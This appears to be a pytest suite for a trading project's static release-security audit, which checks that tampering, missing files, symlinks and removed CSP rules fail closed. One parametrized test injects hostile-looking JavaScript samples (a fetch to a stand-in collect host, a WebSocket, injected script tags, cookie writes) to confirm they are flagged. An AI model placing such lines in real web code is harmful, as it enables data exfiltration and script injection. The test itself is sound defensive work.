"""Stage52 security inventory regressions, including malicious source edits.

Offline tests require no vendor feed, API credentials, trading engine runtime,
broker, network or human signing service. Structural inspection passing does
NOT ever imply production release readiness.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from nexus_titan.operations.release_security_audit import (
    _FRONTEND_FILES,
    _REVIEWED_CODE,
    inspect_stage52_security_sources,
)


ROOT = Path(__file__).resolve().parents[1]


def _copy_reviewed_source(destination: Path) -> Path:
    for name in tuple(_REVIEWED_CODE) + _FRONTEND_FILES:
        target = destination / name
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT / name, target)
    return destination


def _test_assert_release_denied(report):
    assert not report.production_release_allowed
    assert not report.live_trading_enabled
    assert not report.genuine_live_data_authenticated
    assert not report.independent_human_identity_verified
    assert not report.global_unbypassable_risk_enforced
    assert not report.unified_capital_atomicity_verified
    assert not report.signed_candidate_commit_or_pr_review_verified
    assert not report.autonomous_strategy_promotion_allowed
    assert report.broker_orders_transmitted == 0
    assert len(report.release_blockers) == 12
    assert any("legacy" in item.lower() for item in report.release_blockers)
    assert any("capital" in item.lower() for item in report.release_blockers)
    assert any("identity" in item.lower() for item in report.release_blockers)
    assert any("market" in item.lower() for item in report.release_blockers)
    assert "VirtualAccount.execute_fill" in report.known_write_entrypoints


def test_reviewed_candidate_tree_structural_audit_always_blocks_release():
    report = inspect_stage52_security_sources(ROOT)
    assert report.schema_version == 1
    assert report.stage == 52
    assert report.scope == "STATIC_LOCAL_SOURCE_INSPECTION_ONLY"
    assert report.local_structural_controls_passed, [
        (x.check_id, x.finding) for x in report.findings if not x.passed
    ]
    assert report.reviewed_source_digest is not None
    assert len(report.reviewed_source_digest) == 64
    assert report.checked_artifact_count == len(_REVIEWED_CODE) + len(_FRONTEND_FILES)
    assert all(item.passed for item in report.findings)
    _test_assert_release_denied(report)


def test_inspection_is_deterministic_no_repo_mutations():
    a = inspect_stage52_security_sources(ROOT)
    b = inspect_stage52_security_sources(ROOT)
    assert a == b
    assert a.to_dict() == b.to_dict()
    json.dumps(a.to_dict(), allow_nan=False)


def test_clean_copied_source_matches_checked_out_repo_digest(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    actual = inspect_stage52_security_sources(clone)
    assert actual.local_structural_controls_passed
    assert actual.reviewed_source_digest == inspect_stage52_security_sources(
        ROOT,
    ).reviewed_source_digest


@pytest.mark.parametrize("missing", [
    "src/nexus_titan/operations/paper_deployment.py",
    "src/nexus_titan/operations/offline_entry_readiness.py",
    "src/nexus_titan/operations/offline_risk_veto.py",
    "src/nexus_titan/operations/signed_paper_approval.py",
    "src/nexus_titan/operations/durable_paper_fence.py",
    "src/nexus_titan/dashboard/paper_read_model.py",
    "src/nexus_titan/dashboard/api_service.py",
    "src/nexus_titan/core/security_gates.py",
    "src/nexus_titan/virtual/order_manager.py",
    "src/nexus_titan/dashboard/static/stage51.html",
    "src/nexus_titan/dashboard/static/stage51.css",
    "src/nexus_titan/dashboard/static/stage51.js",
])
def test_missing_required_files_fail_closed(tmp_path, missing):
    clone = _copy_reviewed_source(tmp_path)
    (clone / missing).unlink()
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert report.reviewed_source_digest is None
    assert report.checked_artifact_count == len(_REVIEWED_CODE) + len(_FRONTEND_FILES) - 1
    assert any(not item.passed for item in report.findings)
    _test_assert_release_denied(report)


def test_python_syntax_error_fail_closed_without_executing_tampered_code(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    target = clone / "src/nexus_titan/operations/durable_paper_fence.py"
    target.write_text("class invalid Python syntax ***", encoding="utf-8")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert report.reviewed_source_digest is not None
    assert any(item.check_id.startswith("S52-AST-") and not item.passed
               for item in report.findings)
    _test_assert_release_denied(report)


def test_missing_required_signed_approval_gate_fails_closed(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    target = clone / "src/nexus_titan/operations/signed_paper_approval.py"
    original = target.read_text(encoding="utf-8")
    assert "def approve_pending_buy(" in original
    target.write_text(
        original.replace("def approve_pending_buy(", "def approve_without_signature(", 1),
        encoding="utf-8",
    )
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any(x.check_id == "S52-PY-Stage48SignedPaperSession" and not x.passed
               for x in report.findings)


def test_missing_legacy_write_surface_is_unknown_not_safe(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    target = clone / "src/nexus_titan/virtual/order_manager.py"
    original = target.read_text(encoding="utf-8")
    assert "def execute_fill(" in original
    target.write_text(
        original.replace("def execute_fill(", "def renamed_fill(", 1),
        encoding="utf-8",
    )
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    _test_assert_release_denied(report)


@pytest.mark.parametrize("malicious", [
    "fetch('https://example.test/collect')",
    "document.body.innerHTML = '<script>evil</script>'",
    "window.WebSocket('wss://example.test')",
    "document.cookie = 'unsafe'",
    "approve_order('x')",
    "new Function('return 1')",
])
def test_dangerous_browser_source_modification_flagged(tmp_path, malicious):
    clone = _copy_reviewed_source(tmp_path)
    target = clone / "src/nexus_titan/dashboard/static/stage51.js"
    with target.open("a", encoding="utf-8") as f:
        f.write("\n" + malicious + ";\n")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any(x.check_id == "S52-OFFLINE-JS-SAFETY" and not x.passed
               for x in report.findings)
    _test_assert_release_denied(report)


def test_missing_semantic_cash_guard_detected(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    path = clone / "src/nexus_titan/dashboard/static/stage51.js"
    data = path.read_text(encoding="utf-8")
    assert "Cash-match claim contradicts" in data
    path.write_text(data.replace("Cash-match claim contradicts", "Claim is fine", 1),
                    encoding="utf-8")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any(x.check_id == "S52-OFFLINE-JS-SAFETY" and not x.passed
               for x in report.findings)


def test_offline_csp_removed_fails_closed(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    html = clone / "src/nexus_titan/dashboard/static/stage51.html"
    source = html.read_text(encoding="utf-8")
    assert "connect-src 'none'" in source
    html.write_text(source.replace("connect-src 'none'", "connect-src *", 1),
                    encoding="utf-8")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any(x.check_id == "S52-CSP-AND-FACE-PRESERVATION" and not x.passed
               for x in report.findings)


def test_locked_theme_palette_missing_fails_closed(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    css = clone / "src/nexus_titan/dashboard/static/stage51.css"
    source = css.read_text(encoding="utf-8")
    assert "#54c5d5" in source.lower()
    css.write_text(source.replace("#54c5d5", "#000000", 1), encoding="utf-8")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any(x.check_id == "S52-LOCKED-THEME" and not x.passed
               for x in report.findings)


def test_source_symlink_rejected_without_reading_external_content(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    target = clone / "src/nexus_titan/dashboard/static/stage51.js"
    outside = tmp_path.parent / (tmp_path.name + "_source")
    outside.write_text("external data", encoding="utf-8")
    target.unlink()
    try:
        target.symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("Symlinks unavailable")
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert report.reviewed_source_digest is None
    _test_assert_release_denied(report)


def test_bad_root_rejected_or_reported_unsafe(tmp_path):
    with pytest.raises(TypeError):
        inspect_stage52_security_sources(str(tmp_path))
    missing = inspect_stage52_security_sources(tmp_path / "missing")
    assert not missing.local_structural_controls_passed
    assert missing.checked_artifact_count == 0
    _test_assert_release_denied(missing)


def test_oversize_python_source_rejected(tmp_path):
    clone = _copy_reviewed_source(tmp_path)
    path = clone / "src/nexus_titan/operations/durable_paper_fence.py"
    path.write_bytes(b"a" * 513000)
    report = inspect_stage52_security_sources(clone)
    assert not report.local_structural_controls_passed
    assert any("large" in x.finding for x in report.findings)
    _test_assert_release_denied(report)


def test_cli_emits_release_blocked_and_clean_inspection():
    run = subprocess.run(
        [sys.executable, str(ROOT / "scripts" / "run_stage52_security_audit.py")],
        cwd=ROOT, capture_output=True, text=True, check=False, timeout=35,
    )
    assert run.returncode == 0, run.stderr
    report = json.loads(run.stdout)
    assert report["stage"] == 52
    assert report["scope"] == "STATIC_LOCAL_SOURCE_INSPECTION_ONLY"
    assert report["local_structural_controls_passed"] is True
    assert report["production_release_allowed"] is False
    assert report["global_unbypassable_risk_enforced"] is False
    assert report["independent_human_identity_verified"] is False
    assert report["unified_capital_atomicity_verified"] is False
    assert report["broker_orders_transmitted"] == 0
    assert len(report["release_blockers"]) == 12
    assert "secret_key" not in run.stdout
    assert "signature_hex" not in run.stdout


def test_cli_fail_closed_against_missing_root(tmp_path):
    run = subprocess.run(
        [sys.executable, str(ROOT / "scripts" / "run_stage52_security_audit.py"),
         "--root", str(tmp_path / "missing")],
        cwd=ROOT, capture_output=True, text=True, check=False, timeout=35,
    )
    assert run.returncode == 2, run.stderr
    result = json.loads(run.stdout)
    assert result["local_structural_controls_passed"] is False
    assert result["production_release_allowed"] is False
